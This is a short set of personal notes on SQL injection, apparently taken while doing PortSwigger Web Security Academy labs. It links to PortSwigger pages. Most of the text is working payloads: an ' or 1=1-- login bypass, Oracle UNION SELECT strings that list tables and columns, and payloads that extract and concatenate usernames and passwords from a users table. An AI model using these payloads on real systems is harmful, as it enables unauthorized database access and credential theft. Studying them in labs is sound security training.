+ https://portswigger.net/web-security/sql-injection/cheat-sheet


+ ' or 1=1-- (change blankspace with +)(works differently for different database, so try different methods)

+  On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name. There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual 

+ after using union find table info like version, table name, column name

+ example for oracle database:
	'+UNION+SELECT+'abc','def'+FROM+dual--
	'+UNION+SELECT+table_name,NULL+FROM+all_tables--
	'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
	'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+ to concatinate two columns in table
	'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
	
-- Blind SQLI 
+  https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
